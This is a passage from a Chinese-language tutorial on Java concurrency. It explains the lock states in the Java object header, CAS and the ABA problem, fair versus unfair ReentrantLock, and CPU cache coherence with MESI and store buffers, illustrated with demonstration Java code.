try{\n        //调用锁定方法\n        lock.lock(); \n        Thread.sleep(100);\n        System.out.println(ticket--);\n      }catch(Exception e){\n      }finally{\n        //调用解锁方法\n        lock.unlock();\n      }\n    }\n  }\n}\n\n```\n# java锁机制\n## Java 对象头\n锁实际上是加在对象上的，那么被加了锁的对象我们称之为锁对象，在java中，任何一个对象都能成为锁对象。而Java是通过java对象头来判断这个对象什么类型的锁对象，而Java 对象头又是什么呢?我们以 Hotspot 虚拟机为例，对象在内存中存储的布局可以分为3块域：对象头、实例数据和对齐填充。\nHopspot 对象头主要包括两部分数据：Mark Word(标记字段) 和 Klass Pointer(类型指针)。\n\n**Mark Word**：用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等，这部分数据的长度在32位和64位的虚拟机（未开启压缩指针）中分别为32bit和64bit，官方称它为“Mark Word”。例如，在32位的HotSpot虚拟机中，如果对象处于未被锁定的状态下，那么Mark Word的32bit空间中的25bit用于存储对象哈希码，4bit用于存储对象分代年龄，2bit用于存储锁标志位，1bit固定为0。见下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122614.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122625.png)\n\n- 无状态也就是无锁的时候，对象头开辟 25bit 的空间用来存储对象的 hashcode ，4bit 用于存放分代年龄，1bit 用来存放是否偏向锁的标识位，2bit 用来存放锁标识位为01\n- 偏向锁 中划分更细，还是开辟25bit 的空间，其中23bit 用来存放线程ID，2bit 用来存放 epoch，4bit 存放分代年龄，1bit 存放是否偏向锁标识， 0表示无锁，1表示偏向锁，锁的标识位还是01\n- 轻量级锁中直接开辟 30bit 的空间存放指向栈中锁记录的指针，2bit 存放锁的标志位，其标志位为00\n- 重量级锁中和轻量级锁一样，30bit 的空间用来存放指向重量级锁的指针，2bit 存放锁的标识位，为11\n- GC标记开辟30bit 的内存空间却没有占用，2bit 空间存放锁标志位为11。\n- 其中无锁和偏向锁的锁标志位都是01，只是在前面的1bit区分了这是无锁状态还是偏向锁状态。\n\n**Klass Point**：对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。\n\n## 锁的分类及其解释\n### 无锁\n无锁状态，无锁即没有对资源进行锁定，所有的线程都可以对同一个资源进行访问，但是只有一个线程能够成功修改资源。\n\n无锁的特点就是在循环内进行修改操作，线程会不断的尝试修改共享资源，直到能够成功修改资源并退出，在此过程中没有出现冲突的发生，这很像我们在之前文章中介绍的 CAS 实现，CAS 的原理和应用就是无锁的实现。无锁无法全面代替有锁，但无锁在某些场合下的性能是非常高的。\n\n### 偏向锁\nHotspot 的作者经过研究发现，大多数情况下，锁不仅不存在多线程竞争，还存在锁由同一线程多次获得的情况，偏向锁就是在这种情况下出现的，它的出现是为了解决只有在一个线程执行同步时提高性能。\n可以从对象头的分配中看到，偏向锁要比无锁多了线程ID 和 epoch，当一个线程访问同步代码块并获取锁时，会在对象头和栈帧的记录中存储线程的ID，等到下一次线程在进入和退出同步代码块时就不需要进行 CAS 操作进行加锁和解锁，只需要简单判断一下对象头的 Mark Word 中是否存储着指向当前线程的线程ID，判断的标志当然是根据锁的标志位来判断的。\n偏向锁的获取过程\n1. 访问 Mark Word 中偏向锁的标志是否设置成 1，锁的标志位是否是 01 --- 确认为可偏向状态。\n2. 如果确认为可偏向状态，判断当前线程id 和锁对象的对象头中存储的线程 ID 是否一致，如果一致的话，则执行步骤5，如果不一致，进入步骤3\n3. 如果当前线程ID 与对象头中存储的线程ID 不一致的话，则通过 CAS 操作来竞争获取锁。如果竞争成功，则将 Mark Word 中的线程ID 修改为当前线程ID，然后执行步骤5，如果不一致，则执行步骤4\n4. 如果 CAS 获取偏向锁失败，则表示有竞争(CAS 获取偏向锁失败则表明至少有其他线程曾经获取过偏向锁，因为线程不会主动释放偏向锁)。当到达全局安全点(SafePoint)时，会首先暂停拥有偏向锁的线程，然后检查持有偏向锁的线程是否存活(因为可能持有偏向锁的线程已经执行完毕，但是该线程并不会主动去释放偏向锁)，如果线程不处于活动状态，则将对象头置为无锁状态(标志位为01)，然后重新偏向新的线程;如果线程仍然活着，撤销偏向锁后升级到轻量级锁的状态(标志位为00)，此时轻量级锁由原持有偏向锁的线程持有，继续执行其同步代码，而正在竞争的线程会进入自旋等待获得该轻量级锁。\n5. 执行同步代码\n\n通过第4步可以看出撤销偏向锁后升级到轻量级锁的状态的开销花费还是挺大的，所以，如果某些同步代码块大多数情况下都是有两个及以上的线程竞争的话，那么偏向锁就会是一种累赘，对于这种情况，我们可以一开始就把偏向锁这个默认功能给关闭\n\n**偏向锁的释放过程**\n偏向锁的释放过程可以参考上述的步骤4 ，偏向锁在遇到其他线程竞争锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点(在这个时间点上没有字节码正在执行)，它会首先暂停拥有偏向锁的线程，判断锁是否处于被锁定状态，撤销偏向锁后恢复到未锁定(标志位为01)或轻量级锁(标志位为00)的状态。\n\n**关闭偏向锁**\n偏向锁在Java 6 和Java 7 里是默认启用的。由于偏向锁是为了在只有一个线程执行同步块时提高性能，如果你确定应用程序里所有的锁通常情况下处于竞争状态，可以通过JVM参数关闭偏向锁：-XX:-UseBiasedLocking=false，那么程序默认会进入轻量级锁状态。\n\n### 轻量级锁\n轻量级锁是指当前锁是偏向锁的时候，被另外的线程所访问，那么偏向锁就会升级为轻量级锁；\n升级为轻量级锁的过程：\n虚拟机首先将在当前线程的栈帧中建立一个名为锁记录(Lock Record)的空间，用于存储锁对象目前的 Mark Word 的拷贝，然后拷贝对象头中的 Mark Word 复制到锁记录中。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122635.png)\n\n拷贝成功后，虚拟机将使用 CAS 操作尝试将对象的 Mark Word 更新为指向 Lock Record 的指针，并将 Lock Record里的 owner 指针指向对象的 Mark Word。\n\n如果这个更新动作成功了，那么这个线程就拥有了该对象的锁，并且对象Mark Word的锁标志位设置为 00 ，表示此对象处于轻量级锁定状态。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122645.png)\n\n如果这个更新操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行。否则说明多个线程竞争锁，轻量级锁就要膨胀为重量级锁，锁标志的状态值变为 10 ，Mark Word中存储的就是指向重量级锁(互斥量)的指针，后面等待锁的线程也要进入阻塞状态。\n\n**轻量级锁主要有两种：自旋锁、自适应自旋锁**\n**自旋锁**\n所谓自旋，就是指当有另外一个线程来竞争锁时，这个线程会在原地循环等待，而不是把该线程给阻塞，直到那个获得锁的线程释放锁之后，这个线程就可以马上获得锁的。\n注意，锁在原地循环的时候，是会消耗cpu的，就相当于在执行一个啥也没有的for循环。\n所以，轻量级锁适用于那些同步代码块执行的很快的场景，这样，线程原地等待很短很短的时间就能够获得锁了。\n经验表明，大部分同步代码块执行的时间都是很短很短的，也正是基于这个原因，才有了轻量级锁这么个东西。\n自旋锁的一些问题\n如果同步代码块执行的很慢，需要消耗大量的时间，那么这个时侯，其他线程在原地等待空消耗cpu，这会让人很难受。\n本来一个线程把锁释放之后，当前线程是能够获得锁的，但是假如这个时候有好几个线程都在竞争这个锁的话，那么有可能当前线程会获取不到锁，还得原地等待继续空循环消耗cup，甚至有可能一直获取不到锁。\n基于这个问题，我们必须给线程空循环设置一个次数，当线程超过了这个次数，我们就认为，继续使用自旋锁就不适合了，此时锁会再次膨胀，升级为重量级锁。\n默认情况下，自旋的次数为10次，用户可以通过-XX:PreBlockSpin来进行更改。\n自旋锁是在JDK1.4.2的时候引入的\n\n**自适应自旋锁**\n所谓自适应自旋锁就是线程空循环等待的自旋次数并非是固定的，而是会动态着根据实际情况来改变自旋等待的次数。\n其大概原理是这样的：\n假如一个线程1刚刚成功获得一个锁，当它把锁释放了之后，线程2获得该锁，并且线程2在运行的过程中，此时线程1又想来获得该锁了，但线程2还没有释放该锁，所以线程1只能自旋等待，但是虚拟机认为，由于线程1刚刚获得过该锁，那么虚拟机觉得线程1这次自旋也是很有可能能够再次成功获得该锁的，所以会延长线程1自旋的次数。\n另外，如果对于某一个锁，一个线程自旋之后，很少成功获得该锁，那么以后这个线程要获取该锁时，是有可能直接忽略掉自旋过程，直接升级为重量级锁的，以免空循环等待浪费资源。\n轻量级锁也被称为非阻塞同步、乐观锁，因为这个过程并没有把线程阻塞挂起，而是让线程空循环等待，串行执行。\n\n### 重量级锁\n锁标识位为10。该锁对象的对象头的MarkWord去尝试指向操作系统的Monitor对象，让锁对象中的MarkWord和Monitor对象相关联。如果关联成功，将锁对象中的锁标识位为设为10，且Monitor的Owner指向该线程。\n\n下面描述获取重量级锁的过程（假设下面的obj锁对象已经是重量级锁了）:\n当Thread1访问到synchronized(obj)中的共享资源的时候:\n- 首先会将synchronized中的锁对象中对象头的MarkWord去尝试指向操作系统的Monitor对象, 让锁对象中的MarkWord和Monitor对象相关联. 如果关联成功（注：锁对象不同，就会指向不同的Monitor）, 将obj对象头中的MarkWord的对象状态改为10。 Monitor的Owner将指向Thread1\n- 又来了个Thread2执行synchronized(obj)代码, 它首先会看看能不能执行该临界区的代码; 它会检查obj是否关联了Montior, 此时已经有关联了, 它就会去看看该Montior的Owner有没有指向，发现Owner指向Thread1; 此时该Thread2就会进入到它的EntryList(阻塞队列);\n- 当Thread1执行完临界区代码后, Monitor的Owner(所有者)就空出来了. 此时就会通知Monitor中的EntryList阻塞队列中的线程, 这些线程通过竞争, 成为新的所有者\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122655.png)\n\n由于Monitor锁本质又是依赖于底层的操作系统的 Mutex Lock(互斥锁)来实现的。而操作系统实现线程之间的切换需要从用户态转换到核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么 Synchronized 效率低的原因。因此，这种依赖于操作系统 Mutex Lock 所实现的锁我们称之为重量级锁。\n\n**注：synchronized关键字并非一开始就该对象加上重量级锁，也是从偏向锁，轻量级锁，再到重量级锁的过程。**\n\n# 乐观锁与悲观锁\n乐观锁和悲观锁是两种<font color=\"red\">思想</font>，它们的使用是非常广泛的，不局限于某种编程语言或数据库。\n## 乐观锁\n乐观锁：乐观锁在操作数据时非常乐观，认为别人不会同时修改数据。因此乐观锁不会上锁，只是在执行更新的时候判断一下在此期间别人是否修改了数据：如果别人修改了数据则放弃操作，否则执行操作。\n\n乐观锁的实现方式主要有两种：CAS机制和版本号机制\n\n**版本号机制实现乐观锁**\n版本号机制的基本思路是在数据中增加一个字段version，表示该数据的版本号，每当数据被修改，版本号加1。当某个线程查询数据时，将该数据的版本号一起查出来；当该线程更新数据时，判断当前版本号与之前读取的版本号是否一致，如果一致才进行操作。\n需要注意的是，这里使用了版本号作为判断数据变化的标记，实际上可以根据实际情况选用其他能够标记数据版本的字段，如时间戳等。\n\n**乐观锁加锁吗？**\n- 乐观锁本身是不加锁的，只是在更新时判断一下数据是否被其他线程更新了；AtomicInteger便是一个例子。\n- 有时乐观锁可能与加锁操作合作，但不能改变“乐观锁本身不加锁”这一事实\n\n## 悲观锁\n悲观锁：悲观锁在操作数据时比较悲观，认为别人会同时修改数据。因此操作数据时直接把数据锁住，直到操作完成后才会释放锁；上锁期间其他人不能修改数据。\n\n悲观锁的实现方式是加锁，加锁既可以是对代码块加锁（如Java的synchronized关键字），也可以是对数据加锁（如MySQL中的排它锁）。\n\n## 优缺点和适用场景\n乐观锁和悲观锁并没有优劣之分，它们有各自适合的场景；下面从两个方面进行说明。\n**1、功能限制**\n与悲观锁相比，乐观锁适用的场景受到了更多的限制，无论是CAS还是版本号机制。\n例如，CAS只能保证单个变量操作的原子性，当涉及到多个变量时，CAS是无能为力的，而synchronized则可以通过对整个代码块加锁来处理。再比如版本号机制，如果query的时候是针对表1，而update的时候是针对表2，也很难通过简单的版本号来实现乐观锁。\n\n**2、竞争激烈程度**\n如果悲观锁和乐观锁都可以使用，那么选择就要考虑竞争的激烈程度：\n当竞争不激烈 (出现并发冲突的概率小)时，乐观锁更有优势，因为悲观锁会锁住代码块或数据，其他线程无法同时访问，影响并发，而且加锁和释放锁都需要消耗额外的资源。\n当竞争激烈(出现并发冲突的概率大)时，悲观锁更有优势，因为乐观锁在执行更新时频繁失败，需要不断重试，浪费CPU资源。\n\n# CAS\n什么是CAS(Compare And Swap)? 即比较并替换，实现并发算法时常用到的一种技术。CAS操作包含三个操作数：\n- 需要读写的内存位置(V)\n- 进行比较的预期值(A)\n- 拟写入的新值(B)\nCAS操作逻辑如下：如果内存位置V的值等于预期的A值，则将该位置更新为新值B，否则不进行任何操作。许多CAS的操作是`自旋`的：如果操作不成功，会一直重试，直到操作成功为止。\n\n这里引出一个新的问题，既然CAS包含了Compare和Swap两个操作，它又如何保证原子性呢？答案是：**CAS是由CPU支持的原子操作，其原子性是在硬件层面进行保证的。**\n\n如下源代码释义所示，这部分主要为CAS相关操作的方法。\n```java\n/**\n\t*  CAS\n  * @param o         包含要修改field的对象\n  * @param offset    对象中某field的偏移量\n  * @param expected  期望值\n  * @param update    更新值\n  * @return          true | false\n  */\npublic final native boolean compareAndSwapObject(Object o, long offset,  Object expected, Object update);\n\npublic final native boolean compareAndSwapInt(Object o, long offset, int expected,int update);\n  \npublic final native boolean compareAndSwapLong(Object o, long offset, long expected, long update);\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122708.png)\n\n下面以Java中的自增操作(i++)为例，看一下悲观锁和CAS分别是如何保证线程安全的。我们知道，在Java中自增操作不是原子操作，它实际上包含三个独立的操作：（1）读取i值；（2）加1；（3）将新值写回i\n\n因此，如果并发执行自增操作，可能导致计算结果的不准确。在下面的代码示例中：value1没有进行任何线程安全方面的保护，value2使用了乐观锁(CAS)，value3使用了悲观锁(synchronized)。运行程序，使用1000个线程同时对value1、value2和value3进行自增操作，可以发现：value2和value3的值总是等于1000，而value1的值常常小于1000。\n```java\npublic class Test {\n  //value1：线程不安全\n  private static int value1 = 0;\n  //value2：使用乐观锁\n  private static AtomicInteger value2 = new AtomicInteger(0);\n  //value3：使用悲观锁\n  private static int value3 = 0;\n  private static synchronized void increaseValue3(){\n    value3++;\n  }\n    \n  public static void main(String[] args) throws Exception {\n    //开启1000个线程，并执行自增操作\n    for(int i = 0; i < 1000; ++i){\n      new Thread(new Runnable() {\n        @Override\n        public void run() {\n          try {\n            Thread.sleep(100);\n          } catch (InterruptedException e) {\n            e.printStackTrace();\n          }\n          value1++;\n          value2.getAndIncrement();\n          increaseValue3();\n        }\n      }).start();\n    }\n    //打印结果\n    Thread.sleep(1000);\n    System.out.println(\"线程不安全：\" + value1);\n    System.out.println(\"乐观锁(AtomicInteger)：\" + value2);\n    System.out.println(\"悲观锁(synchronized)：\" + value3);\n  }\n}\n```\n首先来介绍AtomicInteger。AtomicInteger是java.util.concurrent.atomic包提供的原子类，利用CPU提供的CAS操作来保证原子性；除了AtomicInteger外，还有AtomicBoolean、AtomicLong、AtomicReference等众多原子类。\n\n下面看一下AtomicInteger的源码，了解下它的自增操作getAndIncrement()是如何实现的（源码以Java7为例，Java8有所不同，但思想类似）。\n```java\npublic class AtomicInteger extends Number implements java.io.Serializable {\n  //存储整数值，volatile保证可视性\n  private volatile int value;\n  //Unsafe用于实现对底层资源的访问\n  private static final Unsafe unsafe = Unsafe.getUnsafe();\n\n  //valueOffset是value在内存中的偏移量\n  private static final long valueOffset;\n  //通过Unsafe获得valueOffset\n  static {\n    try {\n      valueOffset = unsafe.objectFieldOffset(AtomicInteger.class.getDeclaredField(\"value\"));\n    } catch (Exception ex) { throw new Error(ex); }\n  }\n\n  public final boolean compareAndSet(int expect, int update) {\n    return unsafe.compareAndSwapInt(this, valueOffset, expect, update);\n  }\n\n  public final int getAndIncrement() {\n    for (;;) {\n      int current = get();\n      int next = current + 1;\n      if (compareAndSet(current, next))\n        return current;\n    }\n  }\n}\n```\n源码分析说明如下：\n- getAndIncrement()实现的自增操作是自旋CAS操作：在循环中进行compareAndSet，如果执行成功则退出，否则一直执行。\n- 其中compareAndSet是CAS操作的核心，它是利用Unsafe对象实现的。\n- Unsafe又是何许人也呢？Unsafe是用来帮助Java访问操作系统底层资源的类（如可以分配内存、释放内存），通过Unsafe，Java具有了底层操作能力，可以提升运行效率；强大的底层资源操作能力也带来了安全隐患(类的名字Unsafe也在提醒我们这一点)，因此正常情况下用户无法使用。AtomicInteger在这里使用了Unsafe提供的CAS功能。\n- valueOffset可以理解为value在内存中的偏移量，对应了CAS三个操作数(V/A/B)中的V；偏移量的获得也是通过Unsafe实现的。\n- value域的volatile修饰符：Java并发编程要保证线程安全，需要保证原子性、可视性和有序性；CAS操作可以保证原子性，而volatile可以保证可视性和一定程度的有序性；在AtomicInteger中，volatile和CAS一起保证了线程安全性。\n\n说完了AtomicInteger，再说synchronized。synchronized通过对代码块加锁来保证线程安全：在同一时刻，只能有一个线程可以执行代码块中的代码。synchronized是一个重量级的操作，不仅是因为加锁需要消耗额外的资源，还因为线程状态的切换会涉及操作系统核心态和用户态的转换；不过随着JVM对锁进行的一系列优化(如自旋锁、轻量级锁、锁粗化等)，synchronized的性能表现已经越来越好。\n\n## CAS的缺点：\n### ABA问题\n在多线程场景下CAS会出现ABA问题，关于ABA问题这里简单科普下，例如有2个线程同时对同一个值(初始值为A)进行CAS操作，这二个线程如下\n- 线程1，期望值为A，欲更新的值为B\n- 线程2，期望值为A，欲更新的值为B\n线程1抢先获得CPU时间片，而线程2因为其他原因阻塞了，线程1取值与期望的A值比较，发现相等然后将值更新为B，然后这个时候出现了线程3，期望值为B，欲更新的值为A，线程3取值与期望的值B比较，发现相等则将值更新为A，此时线程2从阻塞中恢复，并且获得了CPU时间片，这时候线程2取值与期望的值A比较，发现相等则将值更新为B，虽然线程2也完成了操作，但是线程2并不知道值已经经过了A->B->A的变化过程。\n\n**ABA问题带来的危害：**\n小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50\n线程1（提款机）：获取当前值100，期望更新为50，\n线程2（提款机）：获取当前值100，期望更新为50，\n线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50\n线程3（默认）：获取当前值50，期望更新为100，\n这时候线程3成功执行，余额变为100，\n线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50！！！\n此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。\n\n**解决方法：**\n在变量前面加上版本号，每次变量更新的时候变量的版本号都+1，即A->B->A就变成了1A->2B->3A。\n\n### 循环时间长开销大\n在并发冲突概率大的高竞争环境下，如果CAS一直失败，会一直重试，CPU开销较大。针对这个问题的一个思路是引入退出机制，如重试次数超过一定阈值后失败退出。当然，更重要的是避免在高竞争环境下使用乐观锁。\n\n**解决方法：**\n限制自旋次数，防止进入死循环。\n只能保证一个共享变量的原子操作\n\n### 功能限制\nCAS的功能是比较受限的，例如CAS只能保证单个变量（或者说单个内存值）操作的原子性，这意味着：(1)原子性不一定能保证线程安全，例如在Java中需要与volatile配合来保证线程安全；(2)当涉及到多个变量(内存值)时，CAS也无能为力。\n\n**解决方法：**\n如果需要对多个共享变量进行操作，可以使用加锁方式(悲观锁)保证原子性，或者可以把多个共享变量合并成一个共享变量进行CAS操作。\n\n\n# 公平锁与非公平锁\n**公平锁：**多个线程按照申请锁的顺序去获得锁，线程会直接进入队列去排队，永远都是队列的第一位才能得到锁。\n- 优点：所有的线程都能得到资源，不会饿死在队列中。\n- 缺点：吞吐量会下降很多，队列里面除了第一个线程，其他的线程都会阻塞，cpu唤醒阻塞线程的开销会很大。\n\n**非公平锁**：多个线程去获取锁的时候，会直接去尝试获取，获取不到，再去进入等待队列，如果能获取到，就直接获取到锁。\n- 优点：可以减少CPU唤醒线程的开销，整体的吞吐效率会高点，CPU也不必取唤醒所有线程，会减少唤起线程的数量。\n- 缺点：你们可能也发现了，这样可能导致队列中间的线程一直获取不到锁或者长时间获取不到锁，导致饿死。\n\n## synchronized非公平锁\n```java\npublic class SyncUnFairLockTest {\n  //食堂\n  private static class DiningRoom {\n    //获取食物\n    public void getFood() {\n      System.out.println(Thread.currentThread().getName()+\":排队中\");\n      synchronized (this) {\n        System.out.println(Thread.currentThread().getName()+\":@@@@@@打饭中@@@@@@@\");\n      }\n    }\n  }\n\n  public static void main(String[] args) {\n    DiningRoom diningRoom = new DiningRoom();\n    //让5个同学去打饭\n    for (int i=0; i<5; i++) {\n      new Thread(()->{\n          diningRoom.getFood();\n      },\"同学编号:00\"+(i+1)).start();\n    }\n  }\n}\n```\n如上代码：我们定义一个内部类DiningRoom表示食堂，getFood方法里面用synchronized锁修饰this指向DiningRoom的实例对象（22行中的diningRoom对象），主类中让编号001至005五个同学同时去打饭，用于测试先排队的同学是否能先打到饭？运行程序得到其中一种执行结果如下图所示，002->004->001->003->005同学先去排队，但打饭的顺序是002->003->001->004->005，说明这里003和001两个同学插队了，插到004前面了，我们详细分析执行过程，002先抢到锁打饭了，释放了锁，本来应该是接下来是004抢到锁去打饭（因为004是比003先来排队），但003抢到锁，打饭了，释放了锁，这是第一次插队。现在还是来004抢锁，但是没抢到又被001抢到了，释放锁后才被004抢到，这是第二次插队，后面分别再是004->005抢到锁，释放锁，程序执行完毕。因为003和001插队，我们用代码证明了synchronized是非公平锁。紧接着我们来看下ReentrantLock公平锁和非公平锁。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122717.png)\n\n## ReentrantLock非公平锁\n```java\npublic class UnFairLockTest {\n\n  private static final Lock LOCK = new ReentrantLock(false);\n\n  //食堂\n  private static class DiningRoom {\n    //获取食物\n    public void getFood() {\n      try {\n        System.out.println(Thread.currentThread().getName()+\":正在排队\");\n        LOCK.lock();\n        System.out.println(Thread.currentThread().getName()+\":@@@@@@打饭中@@@@@@@\");\n      } catch (Exception e) {\n        e.printStackTrace();\n      } finally {\n        LOCK.unlock();\n      }\n    }\n  }\n\n  public static void main(String[] args) throws InterruptedException {\n    DiningRoom diningRoom = new DiningRoom();\n    //让5个同学去打饭\n    for (int i=0; i<5; i++) {\n      new Thread(()->{\n          diningRoom.getFood();\n      },\"同学编号:00\"+(i+1)).start();\n    }\n  }\n}\n```\n如上代码：我们在代码第13行中定义了Lock LOCK = new ReentrantLock(false)；ReentrantLock的参数是false表示非公平锁，上面代码需要用LOCK.lock()加锁，LOCK.unlock()解锁，需要放入try，finally代码块中，目的是如果try中加锁后代码发生异常锁最终执行LOCK.unlock()，锁总能被释放。主类中让编号001至005五个同学同时去打饭，得到其中一种执行结果如下图所示，001->004->005->003->002同学先去排队，但打饭的顺序是001->005->004->003->002，这里005同学插队了，插到004前面。我们详细分析执行过程：001先来抢到锁打饭了并释放了锁，接下来本应该是004抢到锁，因为它先排队，但005却在004之前抢到锁，打饭了，005比004后来，却先打饭，这就是不公平锁，后面的执行结果按先来后到执行，程序结束。我们用代码证明了ReentrantLock是非公平的锁。紧接着我们来看下ReentrantLock另一种作为公平锁的情况。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122727.png)\n\n## ReentrantLock公平锁\n基于上面的案例，我们不重复贴代码了，将上述代码中13行的private static final Lock LOCK = new ReentrantLock(false)；参数由false改为true，private static final Lock LOCK = new ReentrantLock(true)；无论执行多少次可以得出一个结论：先排队的童鞋能先打饭，不允许插队体现的就是公平锁。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122739.png)\n\n# 硬件中的并发问题\n<font color=\"red\">一定要注意，我们是面向jvm编程的，而不是面向硬件编程的。jvm帮我们做了很多的处理，所以我们只需要按照jvm的规定来实现并发编程即可。</font>\n## Cache\n为了更清楚的硬件并发问题，我们先看一下Cache与CacheLine\n**Cache**\ncache，中译名高速缓冲存储器，其作用是为了更好的利用局部性原理，减少CPU访问主存的次数。简单地说，CPU正在访问的指令和数据，其可能会被以后多次访问到，或者是该指令和数据附近的内存区域，也可能会被多次访问。因此，第一次访问这一块区域时，将其复制到cache中，以后访问该区域的指令或者数据时，就不用再从主存中取出。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122749.png)\ncache分成多个组，每个组分成多个行，linesize是cache的基本单位，从主存向cache迁移数据都是按照linesize为单位替换的。比如linesize为32Byte，那么迁移必须一次迁移32Byte到cache\n\n当cpu访问一个数据时，先是拿的主存地址，cpu会先拿着这个主存地址到cache中找，若cache命中，就将主存地址转换为cache地址，直接对cache进行操作，与主存无关；若cache不命中(即**cache miss**)，则仍需要访问主存。\n根据命中方式，我们可以将cache分为3类：\n- 直接映射高速缓存\n- 组相联高速缓存\n- 全相联高速缓存\n具体这三种方式是如何实现的，可以看计组\n\n**Cache 结构**\n假设内存容量为M，内存地址为m位：那么寻址范围为000…00~FFF…F(m位)\n倘若把内存地址分为以下三个区间：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122758.png)\n\ntag, set index, block offset三个区间有什么用呢？再来看看Cache的逻辑结构吧\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122807.png)\n\n将此图与上图做对比，可以得出各参数如下：\nB = 2^b\nS = 2^s\n现在来解释一下各个参数的意义：\n一个cache被分为S个组，每个组有E个cacheline，而一个cacheline中，有B个存储单元，现代处理器中，这个存储单元一般是以字节(通常8个位)为单位的，也是最小的寻址单元。因此，在一个内存地址中，中间的s位决定了该单元被映射到哪一组，而最低的b位决定了该单元在cacheline中的偏移量。valid通常是一位，代表该cacheline是否是有效的(当该cacheline不存在内存映射时，当然是无效的)。tag就是内存地址的高t位，因为可能会有多个内存地址映射到同一个cacheline中，所以该位是用来校验该cacheline是否是CPU要访问的内存单元。\n\n**Cache Line**\n当从内存中取单元到cache中时，会一次取一个cacheline大小的内存区域到cache中，然后存进相应的cacheline中。\n\n## 缓存不一致\n现代处理器为了提高内存数据的访问速度，都会有使用cache，**缓存的存在极大的加快了处理器访问内存的速度。但事情总是有两面性的，缓存的存在加快了堆内存的访问速度，同时也带来了一系列额外的复杂性。每个 CPU 缓存中有一份自己的内存副本，会带来各个 CPU 在访问同一块内存的数据时，每个 CPU 缓存中的副本可能不一致的问题**。\n\n**缓存一致性协议**用于管理多个 CPU cache 之间数据的一致性，这些协议十分复杂，<font color=\"red\">不同的cpu，不同的硬件，可能采用的缓存一致性协议不同</font>，在这里我们仅讨论 MESI 协议；\n**MESI协议**，其主要表示缓存数据有四个状态：Modified（已修改）, Exclusive（独占的）,Shared（共享的），Invalid（无效的）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122819.png)\n\n协议在每一个 cache line 中维护一个两位的状态 “tag” ，这个 “tag” 在cache line的物理地址或者数据后。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122832.png)\n\n**MESI 协议消息**\n- Read。\"read\" 消息用来获取指定的数据。会到其他cpu cache或内存中找。 \n- Read Response。该消息携带了 “read” 消息所请求的数据。read response可能来自于内存或者是其他CPU cache。\n- Invalidate。当前cpu想要写修改cache中数据时，且这个数据状态为shared时，才会向其他cache发送该信息，其他 CPU cache 在收到该消息后，必须进行匹配，发现在自己的cache line中有该地址的数据，那么就将其数据状态设置为Invalid，并响应 Invalidate Acknowledge 回应来告诉它我已经设置完了，只有当收到这个响应，才能将数据状态设置成Exclusive。当修改完后数据后，数据状态才变为Modified。如果不是share状态，则直接进行修改，无法发送Invalidate消息。 \n- Invalidate Acknowledge。该消息用做回应 Invalidate 消息。\n- Read Invalidate。该消息中带有物理地址，用来说明想要获取的数据。这个消息还有 Invalidate 消息的效果。其实该消息是 read + Invalidate 消息的组合，发送该消息后cache期望收到一个 read response 回应与Invalidate Acknowledge回应。\n- Writeback。 该消息带有地址和数据，该消息用在 modified 状态的 cache line 被置换时发出，用来将最新的数据写回 memory 或其他下一级 cache 中。\n\n## 内存屏障（Memory Barrier）\n问题的产生\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122842.png)\n如上图 CPU 0 执行了一次写操作。于是 CPU 0 发送了一个 Invalidate 消息，其他所有的 CPU 在收到这个 Invalidate 消息之后，需要将自己 CPU local cache 中的该数据从 cache 中清除，并且发送消息acknowledge告知 CPU 0。CPU 0 在收到所有 CPU 发送的 ack 消息后会将数据写入到自己的local cache中。这里就产生了性能问题：当 CPU 0 在等待其他 CPU 的 ack 消息时是处于停滞的（stall）状态，大部分的时间都是在等待消息。为了提高性能就引入的 Store Buffer。\n\n**Store Buffer**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122852.png)\n\nstore buffer 的目的是让 CPU 不再操作之前进行漫长的等待时间，而是将数据先写入到store buffer中，CPU 无需等待可以继续执行其他指令，等到 CPU 收到了 ack 消息后，再从 store buffer 中将数据写入到 local cache 中。有了 store buffer 之后性能提高了许多，但常言道：“有一利必有一弊。”store buffer 虽然提高了性能但是却引入了新的问题。如下：\n\n```java\n//CPU 0执行一下代码，a在CPU 1的cache上，初始值为0\na = 1;\nb = a + 1;\nassert(b == 2);\n```\n上述代码的执行序列如下：\n1. cpu 0 执行a=1时，由于cpu 0的cache 中没有a ，发生cache miss。 会先发送read invalidate 信息。然后把a等于1的结果放到store buffer上。\n2. CPU 1 收到了 read invalidate 消息，回应 read response和acknowledge消息，把自己local cache中的a清除了。此时cpu 0收到read response回应，则cpu0的cache上有a，且值为0，假设此时cpu 0还没有收到acknowledge回应，所以store buffer中的数据还没有写入到cache中\n3. CPU 0 执行 b = a+1 。从cache上获取到a的值为0，执行a+1,赋给b，此时b 被 CPU 0 独占所以直接写入 cache line ， 这时候 b 的值为 1。\n4. CPU 0 收到acknowledge响应后，将 store buffer中a的值写入到 cache line ， a变为1。\n5. CPU 0 执行 assert(b == 2) , 断言失败\n\n导致这个问题是因为 CPU 